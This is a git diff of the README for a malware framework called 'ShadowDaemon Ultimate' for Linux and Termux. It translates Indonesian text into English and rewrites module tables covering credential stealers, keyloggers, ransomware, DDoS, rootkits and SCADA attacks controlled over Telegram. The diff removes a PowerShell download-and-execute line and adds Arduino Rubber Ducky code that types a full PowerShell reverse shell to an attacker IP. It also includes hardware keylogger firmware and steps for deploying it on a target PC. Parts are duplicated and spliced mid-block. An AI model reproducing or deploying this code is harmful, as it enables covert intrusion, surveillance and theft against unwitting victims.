@@ -41,7 +41,7 @@
 
 ## 🔥 OVERVIEW
 
-**ShadowDaemon Ultimate v4.0** adalah **Malware Framework** paling lengkap untuk Linux dan Termux (Android). Dengan **100+ modules**, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit**, **SCADA Exploitation**, dan **AI-based attacks**.
+**ShadowDaemon Ultimate** is a complete **Malware Framework** for Linux and Termux (Android). With 30+ modules, you can perform various attacks ranging from **Reconnaissance** to **Kernel Rootkit** and **SCADA Exploitation**.
 
 ```
 root@shadow:~# whoami
@@ -61,12 +61,12 @@ Linux is freedom. Knowledge is power.
 
 ### ⚡ Key Highlights
 
-- **100+ Modules** - Dari basic sampai advanced + AI
+- **30+ Modules** - From basic to advanced
 - **Multi-C2 Support** - Telegram & Firebase
 - **Persistence Mechanisms** - systemd, cron, rc.local
 - **Kernel-Level Rootkit** - Process hiding
 - **SCADA/ICS Exploitation** - Stuxnet-style
-- **CPU Microcode Injection** - Level paling dalam
+- **CPU Microcode Injection** - Deepest level
 - **Hardware Attacks** - USB keylogger, Rubber Ducky
 - **AI-Based Exploits** - Automated pentesting
 - **Cross-Platform** - Linux & Termux (Android)
@@ -75,7 +75,7 @@ Linux is freedom. Knowledge is power.
 
 ## 🎯 FEATURES
 
-### 🕵️ Reconnaissance (10 modules)
+### 🕵️ Reconnaissance
 | Module | Function |
 |--------|----------|
 | `geo_tracker.py` | Track victim location via IP |
@@ -83,13 +83,8 @@ Linux is freedom. Knowledge is power.
 | `wifi_stealer.py` | Steal WiFi passwords |
 | `password_stealer.py` | Steal browser passwords (Chrome/Firefox) |
 | `shell.py` | Execute remote shell commands |
-| `port_scanner.py` | Scan ports on target |
-| `mass_scanner.py` | Mass network scanner |
-| `admin_finder.py` | Find admin login pages |
-| `dns_enum.py` | DNS enumeration |
-| `whois_lookup.py` | WHOIS lookup |
 
-### 🎥 Monitoring & Surveillance (15 modules)
+### 🎥 Monitoring & Surveillance
 | Module | Function |
 |--------|----------|
 | `screenshot.py` | Take screenshot |
@@ -97,20 +92,11 @@ Linux is freedom. Knowledge is power.
 | `mic.py` | Record microphone |
 | `screen_recorder.py` | Record screen (video) |
 | `keylogger.py` | Record all keystrokes |
-| `keylog_persist.py` | Persistent keylogger |
-| `screen_stream.py` | Live screen streaming |
-| `audio_stream.py` | Live audio streaming |
-| `webcam_spy.py` | Live webcam spying |
-| `mic_spy.py` | Live microphone spying |
-| `clipboard_stealer.py` | Steal clipboard content |
-| `browser_history.py` | Get browser history |
-| `cookies_stealer.py` | Steal browser cookies |
-| `notification_spy.py` | Spy notifications |
-| `wallpaper_changer.py` | Change desktop wallpaper |
 
-### 💀 Attack Vectors (20 modules)
+### 💀 Attack Vectors
 | Module | Function |
 |--------|----------|
+| `ssh_bruteforce.py` | SSH Bruteforce |
 | `ddos.py` | DDoS (UDP flood, SYN flood) |
 | `ransomware.py` | Ransomware (AES-256 encryption) |
 | `ssh_bruteforce.py` | SSH Bruteforce |
@@ -132,7 +118,7 @@ Linux is freedom. Knowledge is power.
 | `cmd_injection.py` | Command injection tester |
 | `docker_escape.py` | Docker container escape |
 
-### 🔒 Persistence & Evasion (8 modules)
+### 🔒 Persistence & Evasion
 | Module | Function |
 |--------|----------|
 | `persistence.py` | Auto-start via systemd/cron |
@@ -144,7 +130,7 @@ Linux is freedom. Knowledge is power.
 | `tor_killer.py` | Kill Tor processes |
 | `self_destruct.py` | Self-destruct malware |
 
-### 🎛️ Advanced Exploitation (13 modules)
+### 🎛️ Advanced Exploitation
 | Module | Function |
 |--------|----------|
 | `bootkit.py` | Bootloader infection (GRUB/Syslinux) |
@@ -161,14 +147,14 @@ Linux is freedom. Knowledge is power.
 | `kerberos.py` | Kerberos ticket attack |
 | `petitpotam.py` | PetitPotam NTLM coercion |
 
-### 🔧 Hardware Attacks (3 modules)
+### 🔧 Hardware Attacks
 | Module | Function |
 |--------|----------|
 | `usb_spreader.py` | USB auto-spreader |
 | `hardware_keylogger.py` | Hardware keylogger (Arduino/Teensy) |
 | `usb_rubber_ducky.py` | USB Rubber Ducky payload generation |
 
-### 📡 C2 Channels (4 modules)
+### 📡 C2 Channels
 | Module | Function |
 |--------|----------|
 | `telegram_c2.py` | Telegram Bot C2 |
@@ -458,7 +444,7 @@ python3 shadow.py
 3. **Update Config:**
    ```json
    "telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
-   "telegram_chat_id": "YOUR_CHAT_ID"
+"telegram_chat_id": "YOUR_CHAT_ID", 
    ```
 
 ---
@@ -596,27 +582,48 @@ tail -f shadow.log
 
 ### 🛠️ Payload
 
-| Command | Description | Example |
-|---------|-------------|---------|
-| `gen_payload` | Generate FUD payload | `gen_payload` |
-| `crypt_binary` | Encrypt binary | `crypt_binary` |
-| `gen_reverse:<ip>:<port>` | Generate reverse shell | `gen_reverse:192.168.1.100:4444` |
+| Module | File | Function |
+|--------|------|----------|
+| Geolocation | `geo_tracker.py` | Track victim location via IP |
+| WiFi Stealer | `wifi_stealer.py` | Steal stored WiFi passwords |
+| Password Stealer | `password_stealer.py` | Steal passwords from browsers |
+| Network Scanner | `network_exploiter.py` | Scan devices on network |
 
 ### 📂 File Management
 
-| Command | Description | Example |
-|---------|-------------|---------|
-| `browse_files:<path>` | Browse files | `browse_files:/home` |
-| `download_file:<path>` | Download file | `download_file:/etc/passwd` |
+| Module | File | Function |
+|--------|------|----------|
+| Keylogger | `keylogger.py` | Record all keystrokes |
+| Screenshot | `screenshot.py` | Take screenshot |
+| Webcam | `webcam.py` | Capture webcam image |
+| Microphone | `mic.py` | Record room audio |
+| Screen Recorder | `screen_recorder.py` | Record screen (video) |
 
 ### ⚙️ System Control
 
-| Command | Description | Example |
-|---------|-------------|---------|
-| `auto_update` | Update malware from GitHub | `auto_update` |
-| `notif_spam:<text>` | Spam notifications | `notif_spam:Hello` |
-| `mouse:<x>,<y>` | Move mouse | `mouse:500,300` |
-| `type:<text>` | Type text | `type:Hello World` |
+| Module | File | Function |
+|--------|------|----------|
+| Ransomware | `ransomware.py` | Encrypt files with AES-256 |
+| DDoS | `ddos.py` | UDP flood attack |
+| SSH Bruteforce | `ssh_bruteforce.py` | Bruteforce SSH |
+| Port Knocking | `port_knocking.py` | Bypass firewall with knock |
+
+### Advanced Modules
+
+| Module | File | Function |
+|--------|------|----------|
+| Bootkit | `bootkit.py` | Infect GRUB/Syslinux bootloader |
+| BIOS Rootkit | `bios_rootkit.py` | Infect BIOS/UEFI |
+| CPU Microcode | `cpu_microcode.py` | Inject backdoor into CPU |
+| PLC/SCADA | `plc_scada.py` | Stuxnet-style SCADA attacks |
+
+### USB/Hardware Modules
+
+| Module | File | Function |
+|--------|------|----------|
+| USB Spreader | `usb_spreader.py` | Auto-infect USB |
+| Hardware Keylogger | `hardware_keylogger.py` | Arduino/Teensy keylogger |
+| USB Rubber Ducky | `usb_rubber_ducky.py` | Ducky payload generator |
 
 ---
 
@@ -651,9 +658,14 @@ tail -f shadow.log
 
 ## 🔧 ARDUINO SETUP
 
-### 🛠️ Hardware Keylogger (Arduino Nano/Uno)
+### 📦 What You Need
 
-#### 📦 Components Needed
+| No | Device | Price | Function |
+|----|--------|-------|----------|
+| 1 | Arduino Leonardo | Rp 100-150k | USB Rubber Ducky / Keylogger |
+| 2 | Arduino Nano/Uno | Rp 50-100k | Hardware Keylogger |
+| 3 | DigiSpark | Rp 30-50k | USB Rubber Ducky (cheap) |
+| 4 | USB Cable | Rp 10-20k | Connect to PC |
 
 | No | Component | Price | Description |
 |----|-----------|-------|-------------|
@@ -689,165 +701,20 @@ pkg install arduino arduino-core -y
 
 #### 📝 Step 2: Upload Firmware
 
-```cpp
-// Hardware Keylogger - Arduino Nano/Uno
-// イズミー Active 😈🔥
-// Full Keylogger with SD Card Support
-
-#include <SoftwareSerial.h>
-#include <SD.h>
-
-#define RX 10
-#define TX 11
-SoftwareSerial mySerial(RX, TX);
-
-const int chipSelect = 4;
-File keylogFile;
-String keylog = "";
-unsigned long lastSend = 0;
-bool sdCardReady = false;
-
-void setup() {
-  Serial.begin(9600);
-  mySerial.begin(9600);
-  
-  if (!SD.begin(chipSelect)) {
-    Serial.println("[!] SD Card failed!");
-    sdCardReady = false;
-  } else {
-    sdCardReady = true;
-    Serial.println("[*] SD Card ready!");
-  }
-  
-  if (sdCardReady) {
-    keylogFile = SD.open("keylog.txt", FILE_WRITE);
-    if (keylogFile) {
-      keylogFile.println("=== KEYLOGGER STARTED ===");
-      keylogFile.close();
-    }
-  }
-  
-  Serial.println("[*] Keylogger Ready - XoXo AI Active 😈🔥");
-  Serial.println("[*] Commands: GET_LOG, CLEAR_LOG, STATUS");
-}
-
-void loop() {
-  if (mySerial.available()) {
-    char c = mySerial.read();
-    keylog += c;
-    if (keylog.length() > 4096) {
-      saveToSD(keylog);
-      keylog = "";
-    }
-    Serial.print(c);
-  }
-  
-  if (Serial.available()) {
-    String cmd = Serial.readStringUntil('\n');
-    cmd.trim();
-    if (cmd == "GET_LOG") sendLog();
-    else if (cmd == "CLEAR_LOG") clearLog();
-    else if (cmd == "STATUS") sendStatus();
-  }
-  
-  if (millis() - lastSend > 60000) {
-    if (keylog.length() > 0) {
-      saveToSD(keylog);
-      keylog = "";
-    }
-    lastSend = millis();
-  }
-  
-  delay(10);
-}
-
-void saveToSD(String data) {
-  if (!sdCardReady) return;
-  keylogFile = SD.open("keylog.txt", FILE_WRITE);
-  if (keylogFile) {
-    keylogFile.print(data);
-    keylogFile.close();
-  }
-}
-
-void sendLog() {
-  Serial.println("=== KEYLOG START ===");
-  if (keylog.length() > 0) {
-    Serial.print(keylog);
-    keylog = "";
-  }
-  if (sdCardReady) {
-    keylogFile = SD.open("keylog.txt");
-    if (keylogFile) {
-      while (keylogFile.available()) {
-        Serial.write(keylogFile.read());
-      }
-      keylogFile.close();
-    }
-  }
-  Serial.println("=== KEYLOG END ===");
-}
-
-void clearLog() {
-  keylog = "";
-  if (sdCardReady) {
-    SD.remove("keylog.txt");
-    keylogFile = SD.open("keylog.txt", FILE_WRITE);
-    if (keylogFile) {
-      keylogFile.println("=== LOG CLEARED ===");
-      keylogFile.close();
-    }
-  }
-  Serial.println("[*] Log cleared!");
-}
-
-void sendStatus() {
-  Serial.println("=== STATUS ===");
-  Serial.print("Buffer size: ");
-  Serial.println(keylog.length());
-  Serial.print("SD Card: ");
-  Serial.println(sdCardReady ? "Ready" : "Not ready");
-  Serial.print("Uptime: ");
-  Serial.println(millis() / 1000);
-  Serial.println("===============");
-}
+**For Arduino Leonardo:**
+```
+Tools → Board → Boards Manager
+Search "Arduino AVR Boards" → Install
 ```
 
-#### ⬆️ Step 3: Upload to Arduino
-
+**For DigiSpark:**
 ```
-1. Plug Arduino Nano to PC via USB
-2. Tools → Board → Arduino Nano
-3. Tools → Port → Select COMx (Windows) / dev/ttyUSB0 (Linux)
-4. Tools → Processor → ATmega328P (Old Bootloader)
-5. Click Upload (→) icon
-6. Wait for "Upload Complete!"
-```
+File → Preferences
+Add URL:
+https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
 
-#### 🧪 Step 4: Test
-
-```
-1. Plug Arduino into target PC (looks like charger)
-2. Open Serial Monitor (Tools → Serial Monitor)
-3. Set baud rate: 9600
-4. Test commands:
-   - GET_LOG → Get all keylogs
-   - CLEAR_LOG → Clear keylogs
-   - STATUS → Check status
-```
-
-#### 📤 Step 5: Read Keylog from Termux
-
-```bash
-# Read keylog via serial
-python3 -c "
-import serial
-ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
-ser.write(b'GET_LOG\n')
-time.sleep(1)
-while ser.in_waiting:
-    print(ser.read(ser.in_waiting).decode())
-"
+Tools → Board → Boards Manager
+Search "Digistump" → Install
 ```
 
 ---
@@ -864,6 +731,7 @@ while ser.in_waiting:
 
 #### 💻 Step 1: Generate Payload in Termux
 
+#### Step 1: Generate Payload in Termux
 ```bash
 # Generate payload
 create_ducky:reverse_shell
@@ -875,8 +743,7 @@ create_ducky:ransomware
 create_ducky:persistence
 ```
 
-#### 📝 Step 2: Upload to Arduino
-
+#### Step 2: Convert to Arduino Code
 ```cpp
 // USB Rubber Ducky - Arduino Leonardo
 // イズミー Active 😈🔥
@@ -888,18 +755,15 @@ void setup() {
   Keyboard.begin();
   delay(2000);
   
-  // STAGE 1: Open Run
+  // Open Run (Windows Key + R)
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(500);
   
-  // STAGE 2: Download & Execute
-  Keyboard.println("powershell -Command \"$url='http://YOUR_IP/shadow.py';$path='%temp%\\shadow.py';Invoke-WebRequest -Uri $url -OutFile $path;Start-Process 'python' $path\"");
-  delay(1000);
-  Keyboard.press(KEY_RETURN);
-  delay(500);
+  // Type command
+  Keyboard.println("powershell -Command \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
   
   // STAGE 3: Install Keylogger
   Keyboard.press(KEY_LEFT_GUI);
@@ -943,41 +807,97 @@ void loop() {}
 
 **Replace `YOUR_IP` with your server IP!**
 
-#### ⬆️ Step 3: Upload to Arduino
-
+#### Step 3: Upload to Arduino
 ```
 1. Plug Arduino Leonardo to PC via USB
 2. Tools → Board → Arduino Leonardo
-3. Tools → Port → Select COMx (Windows) / dev/ttyACM0 (Linux)
+3. Tools → Port → Select COMx (Windows) or /dev/ttyACM0 (Linux)
 4. Click Upload (→) icon
-5. Wait for "Upload Complete!"
+5. Wait until complete
 ```
 
-#### 🧪 Step 4: Test
-
+#### Step 4: Test
 ```
-1. Plug Arduino Leonardo into target PC
-2. Within 5-10 seconds, malware will:
-   - Download shadow.py from your server
-   - Install keylogger
-   - Create persistence
-   - Hide windows
-3. You get access via Telegram!
+Plug Arduino into target PC
+➜ Within 5 seconds, malware runs!
 ```
 
 ---
 
 ### 💰 DigiSpark (Cheap Alternative)
 
-#### 📦 Components Needed
+#### Step 1: Generate Firmware in Termux
+```bash
+setup_usb_keylogger
+# Output: usb_keylogger.ino
+```
 
-| No | Component | Price |
-|----|-----------|-------|
-| 1 | DigiSpark | Rp 30-50k |
-| 2 | USB Cable | Rp 10-20k |
+#### Step 2: Upload to Arduino
+```cpp
+// Hardware Keylogger - Arduino Nano/Uno
+// イズミー Active 😈🔥
 
 #### 💻 Step 1: Install DigiSpark Board
 
+#define RX 10
+#define TX 11
+SoftwareSerial mySerial(RX, TX);
+
+String keylog = "";
+
+void setup() {
+  Serial.begin(9600);
+  mySerial.begin(9600);
+  Serial.println("[*] Keylogger Ready");
+}
+
+void loop() {
+  // Read from serial
+  if (mySerial.available()) {
+    char c = mySerial.read();
+    keylog += c;
+    if (keylog.length() > 1024) {
+      keylog = "";
+    }
+  }
+  
+  // Send log via serial
+  if (Serial.available()) {
+    String cmd = Serial.readString();
+    if (cmd == "GET_LOG") {
+      Serial.println(keylog);
+      keylog = "";
+    }
+  }
+  
+  delay(10);
+}
+```
+
+#### Step 3: Upload to Arduino
+```
+1. Plug Arduino Nano to PC via USB
+2. Tools → Board → Arduino Nano
+3. Tools → Port → Select COMx
+4. Click Upload
+```
+
+#### Step 4: Read Keylog
+```bash
+# In Termux
+python3 -c "
+import serial
+ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
+ser.write(b'GET_LOG')
+print(ser.read(ser.in_waiting).decode())
+"
+```
+
+---
+
+### 💰 Setup DigiSpark (Cheap Alternative)
+
+#### Step 1: Install DigiSpark Board
 ```
 File → Preferences
 Add URL:
@@ -1021,7 +941,7 @@ void loop() {}
 
 ---
 
-### 📊 Hardware Comparison
+### 📊 Price & Function Comparison
 
 | Device | Price | Function | Speed | Difficulty |
 |--------|-------|----------|-------|------------|
@@ -1067,17 +987,6 @@ pyinstaller --onefile --noconsole payload_xxxxxx.py
 # Send to Windows target
 ```
 
-### Generate Reverse Shell
-
-```bash
-# Generate reverse shell
-gen_reverse:192.168.1.100:4444
-
-# Output: reverse_shell.py
-# Run on target:
-python3 reverse_shell.py
-```
-
 ---
 
 ## 🤖 TELEGRAM BOT SETUP
@@ -1110,50 +1019,6 @@ Find "chat":{"id": 123456789}
 
 ```bash
 curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20active!"
-```
-
-### Step 5: Set Commands
-
-```
-/setcommands
-```
-
-**Copy-paste:**
-```
-info - Show system information
-help - Show all available commands
-shell - Execute shell command on target
-screenshot - Take screenshot of target screen
-webcam - Capture webcam image
-mic - Record microphone (10 seconds)
-record_screen - Record screen (30 seconds)
-keylog_start - Start keylogger
-keylog_stop - Stop keylogger
-keylog_get - Get captured keystrokes
-ransomware - Encrypt files with AES-256
-ddos - DDoS attack on target IP
-knock - Port knocking to bypass firewall
-network_exploit - Network exploitation attack
-industrial_flood - Flood industrial/SCADA protocols
-miner_start - Start cryptocurrency mining
-miner_stop - Stop cryptocurrency mining
-persist - Install persistence (auto-start)
-hide_self - Hide process from task manager
-wipe_trails - Wipe forensic evidence
-usb_spread - Auto-infect USB drives
-setup_usb_keylogger - Setup hardware keylogger
-create_ducky - Generate USB Rubber Ducky payload
-install_bootkit - Infect bootloader (GRUB/Syslinux)
-install_bios_rootkit - Infect BIOS/UEFI firmware
-install_cpu_backdoor - CPU microcode backdoor injection
-trigger_smm - Trigger SMM (System Management Mode) backdoor
-scan_plc - Scan for PLC/SCADA devices
-stuxnet - Deploy Stuxnet-style payload
-gen_payload - Generate FUD payload
-crypt_binary - Encrypt binary file
-mouse - Control mouse remotely
-type - Type text remotely
-selfdestruct - Self-destruct malware
 ```
 
 ---
@@ -1225,7 +1090,7 @@ ls /dev/ttyUSB*
 ## ❓ FAQ
 
 ### Q: What is ShadowDaemon Ultimate?
-**A:** A complete malware framework for Linux/Termux with 100+ modules from basic to AI-based attacks.
+**A:** A complete malware framework for Linux/Termux with 30+ modules from basic to kernel rootkit.
 
 ### Q: Is this illegal?
 **A:** Yes, if used without authorization. For educational and self-testing only.
@@ -1234,22 +1099,13 @@ ls /dev/ttyUSB*
 **A:** Search @BotFather on Telegram, create bot, copy token, and get chat ID from getUpdates.
 
 ### Q: Can it run on Windows?
-**A:** No, Linux only. But payloads can target Windows (Rubber Ducky, exe builder).
+**A:** No, Linux only. But payloads can target Windows (Rubber Ducky).
 
 ### Q: How much does hardware keylogger cost?
 **A:** Rp 50-300k for Arduino/Teensy.
 
 ### Q: Is kernel rootkit dangerous?
 **A:** Yes, can crash or brick the system. Only for lab testing.
-
-### Q: How to update ShadowDaemon?
-**A:** Use command `auto_update` or `git pull` and restart.
-
-### Q: Why some commands don't work on Termux?
-**A:** Some features need hardware (screenshot, webcam) or root (kernel module, bootkit).
-
-### Q: What is the difference between Arduino Nano and Leonardo?
-**A:** Nano is for keylogger, Leonardo is for USB Rubber Ducky (has keyboard emulation).
 
 ---
 
